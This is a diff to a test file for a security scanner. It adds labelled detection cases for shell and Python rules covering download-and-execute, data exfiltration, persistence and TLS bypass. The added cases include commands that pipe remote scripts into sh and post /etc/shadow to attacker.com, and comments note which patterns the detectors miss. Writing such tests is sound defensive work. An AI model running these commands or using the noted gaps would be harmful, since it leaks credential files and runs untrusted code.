@@ -45,6 +45,12 @@ SHELL_FIND_DELETE_CASES = [
     # === True Negatives ===
     ("find /path -name '*.log'", Language.BASH, "shell-find-delete", 0),
     ("find . -type f -print", Language.BASH, "shell-find-delete", 0),
+    (
+        "find /var -maxdepth 1 -name '*.tmp' -delete",
+        Language.BASH,
+        "shell-find-delete",
+        1,
+    ),
     # --- cross-command isolation ---
     ("echo find; echo -delete", Language.BASH, "shell-find-delete", 0),
     ("echo find | grep -delete", Language.BASH, "shell-find-delete", 0),
@@ -317,6 +323,13 @@ SHELL_GIT_HTTP_CLONE_CASES = [
         "shell-git-http-clone",
         0,
     ),
+    # --- TN: submodule add (no clone keyword) ---
+    (
+        "git submodule add http://internal/repo",
+        Language.BASH,
+        "shell-git-http-clone",
+        0,
+    ),
 ]
 
 SHELL_SSH_KEYGEN_WEAK_CASES = [
@@ -502,6 +515,19 @@ SHELL_DOWNLOAD_EXEC_CASES = [
         "shell-download-exec",
         0,
     ),
+    # === TP: wget -O- pipe ===
+    (
+        "wget -O- https://example.com/setup.sh | bash",
+        Language.BASH,
+        "shell-download-exec",
+        1,
+    ),
+    (
+        "curl -fsSL https://example.com/install | sudo sh -s --",
+        Language.BASH,
+        "shell-download-exec",
+        1,
+    ),
 ]
 
 SHELL_REVERSE_SHELL_CASES = [
@@ -610,6 +636,13 @@ SHELL_DATA_EXFIL_CASES = [
     ("rsync user@host:/remote/ /local/", Language.BASH, "shell-data-exfil", 0),
     # --- TN: local only ---
     ("rsync -av /src/ /dst/", Language.BASH, "shell-data-exfil", 0),
+    # --- TP: --form is long form of -F, now matched by regex ---
+    (
+        "curl --form 'file=@/etc/shadow' https://attacker.com/",
+        Language.BASH,
+        "shell-data-exfil",
+        1,
+    ),
 ]
 
 SHELL_DISK_WIPE_CASES = [
@@ -693,6 +726,8 @@ SHELL_PERSISTENCE_CASES = [
     ("systemctl start nginx", Language.BASH, "shell-persistence", 0),
     ("systemctl status firewalld", Language.BASH, "shell-persistence", 0),
     ("cat ~/.bashrc", Language.BASH, "shell-persistence", 0),
+    # --- TN: rc.local not in persistence path list ---
+    ("echo 'cmd' >> /etc/rc.local", Language.BASH, "shell-persistence", 0),
 ]
 
 # =====================================================================
@@ -827,6 +862,8 @@ PY_TLS_BYPASS_CASES = [
     ("requests.get(url)", Language.PYTHON, "py-tls-bypass", 0),
     ("ssl.create_default_context()", Language.PYTHON, "py-tls-bypass", 0),
     ("verify = True", Language.PYTHON, "py-tls-bypass", 0),
+    # --- TN: check_hostname not in regex ---
+    ("context.check_hostname = False", Language.PYTHON, "py-tls-bypass", 0),
 ]
 
 PY_DOWNLOAD_EXEC_CASES = [
@@ -885,6 +922,8 @@ PY_DATA_EXFIL_CASES = [
     ("requests.get(url)", Language.PYTHON, "py-data-exfil", 0),
     ("ftp.retrbinary('RETR file', f.write)", Language.PYTHON, "py-data-exfil", 0),
     ("ftp.retrlines('LIST')", Language.PYTHON, "py-data-exfil", 0),
+    # --- TN: httpx not covered by regex ---
+    ("httpx.post(url, files=files)", Language.PYTHON, "py-data-exfil", 0),
 ]
 
 PY_UNSAFE_DESERIALIZATION_CASES = [
